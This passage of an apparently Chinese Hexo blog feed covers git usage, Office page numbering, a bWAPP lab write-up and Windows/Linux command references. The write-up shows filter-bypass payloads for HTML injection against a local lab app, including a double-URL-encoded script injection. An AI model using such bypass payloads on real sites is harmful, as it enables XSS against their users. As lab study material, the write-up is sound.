//以后直接用此命令便可将本地仓库的文件更新同步到远程仓库</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9464729-aded61ee2a210272.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>报出错误，原因是本地仓库没有readme.md文件，使用此命令即可解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master   //pull=fetch+merge</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9464729-959e426cf3ab0a5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>到目前为止已经完成了上传</p><p>以后再上传文件直接使用这三个命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add . //文件夹内所有文件均上传，可以指定文件来上传</span><br><span class="line">git commit -m &quot;对此次上传文件的描述&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p><strong>PS</strong>：以上操作基于windows以及按照git并配置好了远程链接github的账户</p><h3 id="3-本地获取远程仓库文件"><a href="#3-本地获取远程仓库文件" class="headerlink" title="3.本地获取远程仓库文件"></a>3.本地获取远程仓库文件</h3><p>1、首先要保证本地仓库没有修改过的文件，可以使用<code>git add .</code> 将之前的文件添加到暂存区</p><p>2、然后使用如下命令进行拉取远程文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9464729-5e252ec441a8235d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>这样显示就是本地已经同步远程最新的文件了</p><p>当我们对远程仓库文件做了修改之后，再拉取文件就是如下显示，这样本地仓库已经同步了远程仓库的文件</p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-d0357fa88b9e7c9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>PS:当直接同步本地文件到远程失败时，可能的原因是直接在远程仓库对文件进行了修改，导致两边数据不一致，此时可以这样执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先将远程仓库文件同步到本地</span><br><span class="line">git add .  //</span><br><span class="line">git pull origin master</span><br><span class="line"></span><br><span class="line">同步远程的完成之后，再将本地修改的文件同步到远程仓库</span><br><span class="line">git add . </span><br><span class="line">git commit -m &quot;对上传文件的描述&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-github里面建立仓库&quot;&gt;&lt;a href=&quot;#1-github里面建立仓库&quot; class=&quot;headerlink&quot; title=&quot;1.github里面建立仓库&quot;&gt;&lt;/a&gt;1.github里面建立仓库&lt;/h3&gt;&lt;h4 id=&quot;1、首先在github里面新建一个
      
    
    </summary>
    
      <category term="Web" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Web/"/>
    
    
      <category term="Web" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Office任意页面设置页码为起始页码</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/08/08/Office-Set-Page/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/08/08/Office-Set-Page/</id>
    <published>2018-08-08T01:57:58.000Z</published>
    <updated>2018-08-08T02:21:41.647Z</updated>
    
    <content type="html"><![CDATA[<p>要将第N页的页码设置为第一页，需进行一下设置</p><p>1、进入页码格式，将起始页码设置为1，</p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-ffd9476471f02cf9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-1dfd090de8470547.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>2、将鼠标移动至第N-1页的文段末尾，点击office工具栏上面的布局里面的分隔符，点击下一页（此处以设置第四页的页码为首页为例）</p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-3ebf570174db2c79.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>3、编辑第四页的页脚，将 链接到前一条页眉 去掉，此处为去掉后的界面</p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-ea4e50b1674fffbd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png">4、此时可以在第四页的页脚处添加页码，直接在此处显示页码为1，文档的前三页是没有页码的，如果文档前三页有页码，手动将其删除即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;要将第N页的页码设置为第一页，需进行一下设置&lt;/p&gt;
&lt;p&gt;1、进入页码格式，将起始页码设置为1，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/9464729-ffd9476471f02cf
      
    
    </summary>
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Windows/"/>
    
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Bwapp-Writeup</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/08/05/Bwapp/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/08/05/Bwapp/</id>
    <published>2018-08-05T02:15:06.000Z</published>
    <updated>2018-09-05T02:16:18.025Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h2><h3 id="1-HTML-Injection-Reflected-GET"><a href="#1-HTML-Injection-Reflected-GET" class="headerlink" title="1.HTML Injection - Reflected (GET)"></a>1.HTML Injection - Reflected (GET)</h3><h4 id="1-1-low"><a href="#1-1-low" class="headerlink" title="1.1 low"></a>1.1 low</h4><p>源码未进行任何过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function no_check($data)</span><br><span class="line">&#123;    </span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>便可想到插入xss语句以及其他类型语句<br><img src="https://upload-images.jianshu.io/upload_images/9464729-42e5d4da3fb95f83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>查看源码发现输入的语句以及嵌入到源码中<br><img src="https://upload-images.jianshu.io/upload_images/9464729-a0434c186c80ca2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="1-2-medium"><a href="#1-2-medium" class="headerlink" title="1.2 medium"></a>1.2 medium</h4><p>按照上面的方法进行语句插入，发现直接显示源码，查看源码发现进行了html标签过滤<br><img src="https://upload-images.jianshu.io/upload_images/9464729-aecc36e0ab5dab71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);</span><br><span class="line">$input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);</span><br><span class="line">$input = urldecode($input);</span><br><span class="line">return $input;</span><br></pre></td></tr></table></figure><p>既然对输入的数据进行了编码，那就需要绕过了，对其进行一次url编码不可以，那就对输入的数据进行二次url编码，成功了<br>测试url：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.112.129/bWAPP/htmli_get.php?firstname=%253Cscript%253Ealert%2528%2527xss%2527%2529%253B%253C%252fscript%253E&amp;lastname=%253Ca%2520href%253D%2522http%253A%252f%252fwww.baidu.com%2522%253Eclick%253C%252fa%253E&amp;form=submit</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9464729-e5ebfb4fcd11454e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>查看源码，已经成功写入<br><img src="https://upload-images.jianshu.io/upload_images/9464729-52406df323fee9c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="1-3-high"><a href="#1-3-high" class="headerlink" title="1.3 high"></a>1.3 high</h4><p>这个使用了==htmlentities()==将所有适用的字符转换为HTML实体，故安全性比较略高<br><a href="https://www.zhihu.com/question/27646993" target="_blank" rel="noopener">讲解绕过htmlentities</a><br>至此，可以发现html注入反射型漏洞也是有很大危害的，可以进行xss攻击、页面篡改等攻击</p><h3 id="2-HTML-Injection-Reflected-POST"><a href="#2-HTML-Injection-Reflected-POST" class="headerlink" title="2.HTML Injection - Reflected (POST)"></a>2.HTML Injection - Reflected (POST)</h3><p>post的和get型方式一样，不做过多介绍<br><img src="https://upload-images.jianshu.io/upload_images/9464729-1e2c31c264da644f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h3 id="3-HTML-Injection-Reflected-URL"><a href="#3-HTML-Injection-Reflected-URL" class="headerlink" title="3.HTML Injection - Reflected (URL)"></a>3.HTML Injection - Reflected (URL)</h3><h4 id="3-1-low"><a href="#3-1-low" class="headerlink" title="3.1 low"></a>3.1 low</h4><p>BP抓包，修改host为1.1.1.1<br><img src="https://upload-images.jianshu.io/upload_images/9464729-5480a1dffcc819b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="3-2-medium"><a href="#3-2-medium" class="headerlink" title="3.2 medium"></a>3.2 medium</h4><p>document.write(),动态向页面写入内容<br>document.URL  返回当前页面或文档的URL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;;</span><br></pre></td></tr></table></figure><h4 id="3-3-high"><a href="#3-3-high" class="headerlink" title="3.3 high"></a>3.3 high</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    case &quot;2&quot; :</span><br><span class="line"></span><br><span class="line">        $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">function xss_check_3($data, $encoding = &quot;UTF-8&quot;)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    // htmlspecialchars - converts special characters to HTML entities    </span><br><span class="line">    // &apos;&amp;&apos; (ampersand) becomes &apos;&amp;amp;&apos; </span><br><span class="line">    // &apos;&quot;&apos; (double quote) becomes &apos;&amp;quot;&apos; when ENT_NOQUOTES is not set</span><br><span class="line">    // &quot;&apos;&quot; (single quote) becomes &apos;&amp;#039;&apos; (or &amp;apos;) only when ENT_QUOTES is set</span><br><span class="line">    // &apos;&lt;&apos; (less than) becomes &apos;&amp;lt;&apos;</span><br><span class="line">    // &apos;&gt;&apos; (greater than) becomes &apos;&amp;gt;&apos;  </span><br><span class="line">    </span><br><span class="line">    return htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Injection&quot;&gt;&lt;a href=&quot;#Injection&quot; class=&quot;headerlink&quot; title=&quot;Injection&quot;&gt;&lt;/a&gt;Injection&lt;/h2&gt;&lt;h3 id=&quot;1-HTML-Injection-Reflected-GET&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>信息收集之命令行的使用</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/08/01/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/08/01/信息收集之命令行的使用/</id>
    <published>2018-08-01T08:07:38.000Z</published>
    <updated>2018-08-04T08:44:40.613Z</updated>
    
    <content type="html"><![CDATA[<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>nslookup命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题。<br><code>nslookup baidu.com</code></p><p>只要在查询的时候，加上-d参数，即可查询域名的缓存。<br>nslookup -qt=type domain [dns-server]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">type可以是以下这些类型：</span><br><span class="line"></span><br><span class="line">A 地址记录</span><br><span class="line">AAAA 地址记录</span><br><span class="line">AFSDB Andrew文件系统数据库服务器记录</span><br><span class="line">ATMA ATM地址记录</span><br><span class="line">CNAME 别名记录</span><br><span class="line">HINFO 硬件配置记录，包括CPU、操作系统信息</span><br><span class="line">ISDN 域名对应的ISDN号码</span><br><span class="line">MB 存放指定邮箱的服务器</span><br><span class="line">MG 邮件组记录</span><br><span class="line">MINFO 邮件组和邮箱的信息记录</span><br><span class="line">MR 改名的邮箱记录</span><br><span class="line">MX 邮件服务器记录</span><br><span class="line">NS 名字服务器记录</span><br><span class="line">PTR 反向记录</span><br><span class="line">RP 负责人记录</span><br><span class="line">RT 路由穿透记录</span><br><span class="line">SRV TCP服务器信息记录</span><br><span class="line">TXT 域名对应的文本信息</span><br><span class="line">X25 域名对应的X.25地址记录</span><br><span class="line">例：nslookup -qt=mx baidu.com 8.8.8.8</span><br></pre></td></tr></table></figure></p><h3 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h3><p>Linux下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami；显示的是当前用户下的用户名</span><br><span class="line">who am i：显示的是登录时的用户名</span><br><span class="line">who：显示当前真正登录系统中的用户（不会显示那些用su命令切换用户的登录者）</span><br></pre></td></tr></table></figure></p><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>用来查找并显示指定用户账号、域名相关信息，包括域名注册时间、拥有者、邮箱等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">可选参数</span><br><span class="line">-a  搜寻所有数据库</span><br><span class="line">-c  找到最小的包含一个 mnt-irt 属性的匹配</span><br><span class="line">-d  同时返回 DNS 反向查询的代理对象(需支持RPSL协议)</span><br><span class="line">-F  快速输出原始数据</span><br><span class="line">-H  隐藏法律声明内容</span><br><span class="line">-i ATTR 进行一次反向查询</span><br><span class="line">-l  将精确度降低一级的查询 (需支持RPSL协议)</span><br><span class="line">-L  找到所有低精确度匹配</span><br><span class="line">-m  找到第一级较高精确度匹配</span><br><span class="line">-M  找到所有较高精确度匹配</span><br><span class="line">-r  查询联系信息时关闭递归查询</span><br><span class="line">-R  显示本地域名对象副本</span><br><span class="line">-x  精确匹配</span><br><span class="line">-h[主机]  连接到指定 HOST 服务器</span><br><span class="line">-p[端口] 连接到指定 PORT 端口</span><br><span class="line">-t[类型]  查询指定类型对象头信息</span><br><span class="line">-T[类型]  查找指定类型的对象</span><br><span class="line">-v[类型]  查询指定类型对象冗余信息</span><br><span class="line">-q [版本|类型] 查询特定的服务器信息(需支持RPSL协议)</span><br><span class="line">更多参数可以使用man whois 查询</span><br></pre></td></tr></table></figure></p><h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p>使用它可以轻松的管理本地或者远程计算机的网络环境，以及各种服务程序的运行和配置。或者进行用户管理和登陆管理等。     </p><h4 id="net-use"><a href="#net-use" class="headerlink" title="net use"></a>net use</h4><p>连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NET USE</span><br><span class="line">:[domainname\]username]</span><br><span class="line">        [/USER:[dotted domain name\]username]</span><br><span class="line">        [/USER:[username@dotted domain name]</span><br><span class="line">        [/SMARTCARD]</span><br><span class="line">        [/SAVECRED]</span><br><span class="line">        [/REQUIREINTEGRITY]</span><br></pre></td></tr></table></figure></p><h4 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h4><p>添加或更改用户账号或显示用户账号信息<br>此命令的语法是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> net user /?</span><br><span class="line"></span><br><span class="line">NET USER</span><br><span class="line">[username [password | *] [options]] [/DOMAIN]</span><br><span class="line">         username &#123;password | *&#125; /ADD [options] [/DOMAIN]</span><br><span class="line">         username [/DELETE] [/DOMAIN]</span><br><span class="line">         username [/TIMES:&#123;times | ALL&#125;]</span><br><span class="line">         username [/ACTIVE: &#123;YES | NO&#125;]</span><br><span class="line">         </span><br><span class="line">查看指定用户信息：net user Administrator</span><br><span class="line">添加一个用户：net user username password /add /fullname：&quot;全名&quot;   </span><br><span class="line">修改指定用户密码：net user username NewPassword</span><br><span class="line">禁用指定用户：net user username /active:no</span><br><span class="line">启用指定用户：net user username /active:yes</span><br></pre></td></tr></table></figure></p><h4 id="net-share"><a href="#net-share" class="headerlink" title="net share"></a>net share</h4><p>创建、删除或显示共享资源<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">NET SHARE</span><br><span class="line">sharename</span><br><span class="line">          sharename=drive:path [/GRANT:user,[READ | CHANGE | FULL]]</span><br><span class="line">                               [/USERS:number | /UNLIMITED]</span><br><span class="line">                               [/REMARK:&quot;text&quot;]</span><br><span class="line">                               [/CACHE:Manual | Documents| Programs | BranchCache | None]</span><br><span class="line">          sharename [/USERS:number | /UNLIMITED]</span><br><span class="line">                    [/REMARK:&quot;text&quot;]</span><br><span class="line">                    [/CACHE:Manual | Documents | Programs | BranchCache | None]</span><br><span class="line">          &#123;sharename | devicename | drive:path&#125; /DELETE</span><br><span class="line">          sharename \\computername /DELETE</span><br></pre></td></tr></table></figure></p><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>用于列出系统上所有的网络套接字连接情况，包括tcp，udp<br>参数使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">NETSTAT [-a] [-b] [-e] [-f] [-n] [-o] [-p proto] [-r] [-s] [-x] [-t] [interval]</span><br><span class="line"></span><br><span class="line">  -a            显示所有连接和侦听端口。</span><br><span class="line">  -b            显示在创建每个连接或侦听端口时涉及的</span><br><span class="line">                可执行程序。在某些情况下，已知可执行程序承载</span><br><span class="line">                多个独立的组件，这些情况下，</span><br><span class="line">                显示创建连接或侦听端口时</span><br><span class="line">                涉及的组件序列。在此情况下，可执行程序的</span><br><span class="line">                名称位于底部 [] 中，它调用的组件位于顶部，</span><br><span class="line">                直至达到 TCP/IP。注意，此选项</span><br><span class="line">                可能很耗时，并且在你没有足够</span><br><span class="line">                权限时可能失败。</span><br><span class="line">  -e            显示以太网统计信息。此选项可以与 -s 选项</span><br><span class="line">                结合使用。</span><br><span class="line">  -f            显示外部地址的完全限定</span><br><span class="line">                域名(FQDN)。</span><br><span class="line">  -n            以数字形式显示地址和端口号。</span><br><span class="line">  -o            显示拥有的与每个连接关联的进程 ID。</span><br><span class="line">  -p proto      显示 proto 指定的协议的连接；proto</span><br><span class="line">                可以是下列任何一个: TCP、UDP、TCPv6 或 UDPv6。如果与 -s</span><br><span class="line">                选项一起用来显示每个协议的统计信息，proto 可以是下列任何一个:</span><br><span class="line">                IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 或 UDPv6。</span><br><span class="line">  -q            显示所有连接、侦听端口和绑定的</span><br><span class="line">                非侦听 TCP 端口。绑定的非侦听端口</span><br><span class="line">                 不一定与活动连接相关联。</span><br><span class="line">  -r            显示路由表。</span><br><span class="line">  -s            显示每个协议的统计信息。默认情况下，</span><br><span class="line">                显示 IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 和 UDPv6 的统计信息;</span><br><span class="line">                -p 选项可用于指定默认的子网。</span><br><span class="line">  -t            显示当前连接卸载状态。</span><br><span class="line">  -x            显示 NetworkDirect 连接、侦听器和共享</span><br><span class="line">                终结点。</span><br><span class="line">  -y            显示所有连接的 TCP 连接模板。</span><br><span class="line">                无法与其他选项结合使用。</span><br><span class="line">  interval      重新显示选定的统计信息，各个显示间暂停的</span><br><span class="line">                间隔秒数。按 CTRL+C 停止重新显示</span><br><span class="line">                统计信息。如果省略，则 netstat 将打印当前的</span><br><span class="line">                配置信息一次。</span><br></pre></td></tr></table></figure></p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>用来测试网络连通性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">参数如下：</span><br><span class="line">输入ping /? ，列出ping的相关参数</span><br><span class="line"></span><br><span class="line">-c  用来指定ping的回应次数</span><br><span class="line">-t ：Ping 指定的计算机直到中断。</span><br><span class="line">-a ：将地址解析为计算机名。</span><br><span class="line">-n count ：发送 count 指定的 ECHO 数据包数。默认值为 4。</span><br><span class="line">-l size ：发送包含由 size 指定的数据量的 ECHO 数据包。默认为 32 字节；最大值是65,527。</span><br><span class="line">-f ：在数据包中发送&quot;不要分段&quot;标志。数据包就不会被路由上的网关分段。</span><br><span class="line">-i ttl :将&quot;生存时间&quot;字段设置为 ttl 指定的值。</span><br><span class="line">-v tos :将&quot;服务类型&quot;字段设置为 tos 指定的值。</span><br><span class="line">-r count :在&quot;记录路由&quot;字段中记录传出和返回数据包的路由。count 可以指定最少 1 台，最多 9 台计算机。</span><br><span class="line">-s count :指定 count 指定的跃点数的时间戳。</span><br><span class="line">-j host-list :利用 host-list 指定的计算机列表路由数据包。连续计算机可以被中间网关分隔（路由稀疏源）IP 允许的最大数量为 9。</span><br><span class="line">-k host-list :利用 host-list 指定的计算机列表路由数据包。连续计算机不能被中间网关分隔（路由严格源）IP 允许的最大数量为 9。</span><br><span class="line">-w timeout :指定超时间隔，单位为毫秒。</span><br><span class="line">destination-list :指定要 ping 的远程计算机。</span><br></pre></td></tr></table></figure></p><h3 id="tracert-windows下-traceroute-unix-amp-linux"><a href="#tracert-windows下-traceroute-unix-amp-linux" class="headerlink" title="tracert(windows下) || traceroute(unix&amp;linux)"></a>tracert(windows下) || traceroute(unix&amp;linux)</h3><p>用于探测数据包从源到目的经过路由的IP,分析网络拓扑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用法: tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout]</span><br><span class="line">               [-R] [-S srcaddr] [-4] [-6] target_name</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">    -d                 不将地址解析成主机名。</span><br><span class="line">    -h maximum_hops    搜索目标的最大跃点数。</span><br><span class="line">    -j host-list       与主机列表一起的松散源路由(仅适用于 IPv4)。</span><br><span class="line">    -w timeout         等待每个回复的超时时间(以毫秒为单位)。</span><br><span class="line">    -R                 跟踪往返行程路径(仅适用于 IPv6)。</span><br><span class="line">    -S srcaddr         要使用的源地址(仅适用于 IPv6)。</span><br><span class="line">    -4                 强制使用 IPv4。</span><br><span class="line">    -6                 强制使用 IPv6。</span><br></pre></td></tr></table></figure></p><h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">用法:</span><br><span class="line">    ipconfig [/allcompartments] [/? | /all |</span><br><span class="line">                                 /renew [adapter] | /release [adapter] |</span><br><span class="line">                                 /renew6 [adapter] | /release6 [adapter] |</span><br><span class="line">                                 /flushdns | /displaydns | /registerdns |</span><br><span class="line">                                 /showclassid adapter |</span><br><span class="line">                                 /setclassid adapter [classid] |</span><br><span class="line">                                 /showclassid6 adapter |</span><br><span class="line">                                 /setclassid6 adapter [classid] ]</span><br><span class="line"></span><br><span class="line">其中</span><br><span class="line">    adapter             连接名称</span><br><span class="line">                       (允许使用通配符 * 和 ?，参见示例)</span><br><span class="line"></span><br><span class="line">    选项:</span><br><span class="line">       /?               显示此帮助消息</span><br><span class="line">       /all             显示完整配置信息。</span><br><span class="line">       /release         释放指定适配器的 IPv4 地址。</span><br><span class="line">       